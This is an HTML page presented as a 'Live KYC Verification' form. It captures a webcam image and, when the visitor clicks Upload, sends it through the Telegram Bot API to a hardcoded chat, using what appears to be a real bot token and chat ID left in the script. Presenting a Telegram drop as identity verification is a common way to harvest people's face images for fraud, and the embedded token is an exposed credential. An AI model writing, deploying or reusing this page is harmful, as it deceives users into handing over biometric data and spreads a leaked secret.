<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>KYC Verification</title>
</head>
<body>
    <h2>Live KYC Verification</h2>
    <!-- Video element to display camera feed -->
    <video id="video" width="320" height="240" autoplay></video>
    <!-- Capture button -->
    <button id="capture">Capture</button>
    <!-- Canvas element to show captured image -->
    <canvas id="canvas" width="320" height="240"></canvas>
    <!-- Upload button -->
    <button id="upload">Upload</button>

    <script>
        let video = document.getElementById("video");
        let canvas = document.getElementById("canvas");
        let context = canvas.getContext("2d");

        // Request camera access
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => video.srcObject = stream)
            .catch(error => alert("Camera access denied!"));

        // Capture the image from the video stream
        document.getElementById("capture").addEventListener("click", function() {
            context.drawImage(video, 0, 0, 320, 240);
        });

        // Upload the captured image via Telegram bot API
        document.getElementById("upload").addEventListener("click", function() {
            let imageData = canvas.toDataURL("image/png");

            fetch("https://api.telegram.org/bot8110395503:AAHUyuCmSqNCjSRXIQvJP915LygZKMnZCYw/sendPhoto", {  // **Replace YOUR_BOT_TOKEN with your actual bot token**
                method: "POST",
                body: JSON.stringify({
                    chat_id: "7176956295",  // **Replace YOUR_TELEGRAM_CHAT_ID with your Telegram chat ID**
                    photo: imageData
                }),
                headers: { "Content-Type": "application/json" }
            })
            .then(response => response.json())
            .then(data => alert("âœ… Image sent to Telegram bot!"))
            .catch(error => console.error(error));
        });
    </script>
</body>
</html>
